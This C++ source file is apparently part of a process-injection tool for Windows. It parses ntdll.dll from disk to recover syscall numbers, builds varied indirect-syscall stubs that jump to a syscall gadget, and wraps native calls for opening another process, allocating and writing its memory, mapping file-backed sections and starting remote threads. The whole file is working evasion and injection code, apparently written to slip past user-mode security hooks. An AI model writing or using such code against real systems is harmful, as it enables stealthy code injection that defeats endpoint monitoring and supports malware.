#include "syscalls.h"
#include "stealth_strings.h"
#include <tlhelp32.h>

static uint8_t* g_stub_page = nullptr;
static int g_stub_offset = 0;
static uint8_t* g_syscall_gadget = nullptr;
static constexpr int STUB_SIZE = 32;

void find_syscall_gadget() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) { LOG("ntdll not loaded\n"); exit(1); }
    uint8_t* base = (uint8_t*)ntdll;
    uint32_t pe_off = *(uint32_t*)(base + 0x3C);
    uint16_t num_sec = *(uint16_t*)(base + pe_off + 6);
    uint16_t opt_sz  = *(uint16_t*)(base + pe_off + 20);
    uint32_t sec_off = pe_off + 24 + opt_sz;
    for (uint16_t i = 0; i < num_sec; i++) {
        uint8_t* sec = base + sec_off + i * 40;
        if (memcmp(sec, ".text", 5) != 0) continue;
        uint32_t vsize = *(uint32_t*)(sec + 8);
        uint32_t rva   = *(uint32_t*)(sec + 12);
        uint8_t* text  = base + rva;
        for (uint32_t j = 0; j + 2 < vsize; j++) {
            if (text[j] == 0x0F && text[j+1] == 0x05 && text[j+2] == 0xC3) {
                g_syscall_gadget = text + j;
                return;
            }
        }
    }
    LOG("Cannot find syscall;ret gadget in ntdll\n"); exit(1);
}

static SyscallStub make_stub(uint32_t num) {
    if (!g_stub_page) {
        g_stub_page = (uint8_t*)VirtualAlloc(nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!g_stub_page) { LOG("VirtualAlloc stub page failed\n"); exit(1); }
    }
    uint8_t* p = g_stub_page + g_stub_offset;
    int idx = g_stub_offset / STUB_SIZE;
    int off = 0;

    switch (idx % 4) {
    case 0: p[off++]=0x4C; p[off++]=0x8B; p[off++]=0xD1; p[off++]=0xB8; *(uint32_t*)(p+off)=num; off+=4; break;
    case 1: p[off++]=0xB8; *(uint32_t*)(p+off)=num; off+=4; p[off++]=0x4C; p[off++]=0x8B; p[off++]=0xD1; break;
    case 2: p[off++]=0x51; p[off++]=0x41; p[off++]=0x5A; p[off++]=0xB8; *(uint32_t*)(p+off)=num; off+=4; break;
    case 3: p[off++]=0x4C; p[off++]=0x8B; p[off++]=0xD1; p[off++]=0x31; p[off++]=0xC0; p[off++]=0x05; *(uint32_t*)(p+off)=num; off+=4; break;
    }

    p[off++] = 0xFF; p[off++] = 0x25; *(uint32_t*)(p+off) = 0; off += 4;
    *(uint64_t*)(p+off) = (uint64_t)g_syscall_gadget;

    g_stub_offset += STUB_SIZE;
    return {num, p};
}

void lock_stubs() {
    if (g_stub_page) {
        ULONG old;
        VirtualProtect(g_stub_page, 4096, PAGE_EXECUTE_READ, &old);
    }
}

static uint32_t find_syscall_number(const uint8_t* nt_data, size_t nt_size, const char* func_name) {
    uint32_t pe_off = *(uint32_t*)(nt_data + 0x3C);
    uint16_t num_sec = *(uint16_t*)(nt_data + pe_off + 6);
    uint16_t opt_sz  = *(uint16_t*)(nt_data + pe_off + 20);
    uint32_t opt_off = pe_off + 24;
    uint32_t sec_off = opt_off + opt_sz;
    uint16_t magic   = *(uint16_t*)(nt_data + opt_off);
    uint32_t exp_rva = *(uint32_t*)(nt_data + opt_off + (magic == 0x20b ? 112 : 96));

    auto rva2off = [&](uint32_t rva) -> uint32_t {
        for (uint16_t i = 0; i < num_sec; i++) {
            uint32_t s = sec_off + i * 40;
            uint32_t va = *(uint32_t*)(nt_data + s + 12);
            uint32_t vs = *(uint32_t*)(nt_data + s + 8);
            uint32_t raw = *(uint32_t*)(nt_data + s + 20);
            if (rva >= va && rva < va + vs) return rva - va + raw;
        }
        return 0;
    };

    uint32_t e = rva2off(exp_rva);
    uint32_t nn = *(uint32_t*)(nt_data + e + 24);
    uint32_t at = rva2off(*(uint32_t*)(nt_data + e + 28));
    uint32_t nt = rva2off(*(uint32_t*)(nt_data + e + 32));
    uint32_t ot = rva2off(*(uint32_t*)(nt_data + e + 36));

    for (uint32_t i = 0; i < nn; i++) {
        uint32_t nr = *(uint32_t*)(nt_data + nt + i * 4);
        uint32_t no = rva2off(nr);
        if (strcmp((const char*)(nt_data + no), func_name) == 0) {
            uint16_t ord = *(uint16_t*)(nt_data + ot + i * 2);
            uint32_t fr  = *(uint32_t*)(nt_data + at + ord * 4);
            uint32_t fo  = rva2off(fr);
            const uint8_t* fn = nt_data + fo;
            for (int j = 0; j < 28; j++) {
                if (fn[j] == 0xB8 && fn[j+3] == 0x00 && fn[j+4] == 0x00) {
                    uint32_t num = *(uint32_t*)(fn + j + 1);
                    if (num < 0x10000) return num;
                }
            }
        }
    }
    LOG("Syscall not found: %s\n", func_name); exit(1);
}

OverlaySyscalls g_sys;

OverlaySyscalls resolve_overlay_syscalls() {
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat_s(path, "\\ntdll.dll");
    FILE* f = fopen(path, "rb");
    if (!f) { LOG("Cannot open ntdll\n"); exit(1); }
    fseek(f, 0, SEEK_END); size_t sz = ftell(f); fseek(f, 0, SEEK_SET);
    std::vector<uint8_t> d(sz);
    fread(d.data(), 1, sz, f); fclose(f);

    OverlaySyscalls t;
    t.NtOpenProcess           = make_stub(find_syscall_number(d.data(), sz, "NtOpenProcess"));
    t.NtAllocateVirtualMemory = make_stub(find_syscall_number(d.data(), sz, "NtAllocateVirtualMemory"));
    t.NtFreeVirtualMemory     = make_stub(find_syscall_number(d.data(), sz, "NtFreeVirtualMemory"));
    t.NtWriteVirtualMemory    = make_stub(find_syscall_number(d.data(), sz, "NtWriteVirtualMemory"));
    t.NtProtectVirtualMemory  = make_stub(find_syscall_number(d.data(), sz, "NtProtectVirtualMemory"));
    t.NtCreateThreadEx        = make_stub(find_syscall_number(d.data(), sz, "NtCreateThreadEx"));
    t.NtCreateSection         = make_stub(find_syscall_number(d.data(), sz, "NtCreateSection"));
    t.NtMapViewOfSection      = make_stub(find_syscall_number(d.data(), sz, "NtMapViewOfSection"));
    return t;
}

HANDLE sys_open(DWORD pid, ULONG access) {
    HANDLE h = nullptr;
    struct { ULONG Length; HANDLE RootDirectory; void* ObjectName; ULONG Attributes; void* SecurityDescriptor; void* SecurityQualityOfService; } oa = {sizeof(oa)};
    struct { void* UniqueProcess; void* UniqueThread; } cid = {(void*)(uintptr_t)pid};
    ((fn_NtOpenProcess)g_sys.NtOpenProcess.code)(&h, access, &oa, &cid);
    return h;
}

bool sys_write(HANDLE h, uint64_t addr, const void* buf, size_t sz) {
    return ((fn_NtWriteVirtualMemory)g_sys.NtWriteVirtualMemory.code)(h, (void*)addr, (void*)buf, sz, nullptr) == 0;
}

bool sys_protect(HANDLE h, uint64_t addr, size_t sz, ULONG new_prot, ULONG* old_prot) {
    void* base = (void*)addr;
    SIZE_T region = sz;
    return ((fn_NtProtectVirtualMemory)g_sys.NtProtectVirtualMemory.code)(h, &base, &region, new_prot, old_prot) == 0;
}

bool sys_free(HANDLE h, uint64_t addr) {
    void* base = (void*)addr;
    SIZE_T region = 0;
    return ((fn_NtFreeVirtualMemory)g_sys.NtFreeVirtualMemory.code)(h, &base, &region, 0x8000) == 0;
}

uint64_t sys_alloc_remote(HANDLE h, size_t size, ULONG prot) {
    void* base = nullptr;
    SIZE_T region = size;
    NTSTATUS st = ((fn_NtAllocateVirtualMemory)g_sys.NtAllocateVirtualMemory.code)(h, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, prot);
    return (st == 0 && base) ? (uint64_t)(uintptr_t)base : 0;
}

uint64_t sys_alloc_remote_backed(HANDLE h, size_t size, const wchar_t* backing_file) {
    HANDLE hFile = CreateFileW(backing_file, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    HANDLE hSection = nullptr;
    struct { ULONG Length; HANDLE RootDirectory; void* ObjectName; ULONG Attributes; void* SecurityDescriptor; void* SecurityQualityOfService; } oa = {sizeof(oa)};
    LARGE_INTEGER maxSize; maxSize.QuadPart = (LONGLONG)size;
    NTSTATUS st = ((fn_NtCreateSection)g_sys.NtCreateSection.code)(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, &oa, &maxSize, PAGE_READWRITE, SEC_COMMIT, hFile);
    CloseHandle(hFile);
    if (st != 0 || !hSection) return 0;

    void* base = nullptr;
    SIZE_T viewSize = size;
    st = ((fn_NtMapViewOfSection)g_sys.NtMapViewOfSection.code)(hSection, h, &base, 0, size, nullptr, &viewSize, 2, 0, PAGE_READWRITE);
    CloseHandle(hSection);
    return (st == 0 && base) ? (uint64_t)(uintptr_t)base : 0;
}

HANDLE sys_create_thread(HANDLE process, LPTHREAD_START_ROUTINE start, PVOID param) {
    HANDLE thread = nullptr;
    ((fn_NtCreateThreadEx)g_sys.NtCreateThreadEx.code)(&thread, THREAD_ALL_ACCESS, nullptr, process, start, param, 0, 0, 0, 0, nullptr);
    return thread;
}

DWORD find_pid(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe{}; pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do { if (_stricmp(pe.szExeFile, name) == 0) { CloseHandle(snap); return pe.th32ProcessID; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}
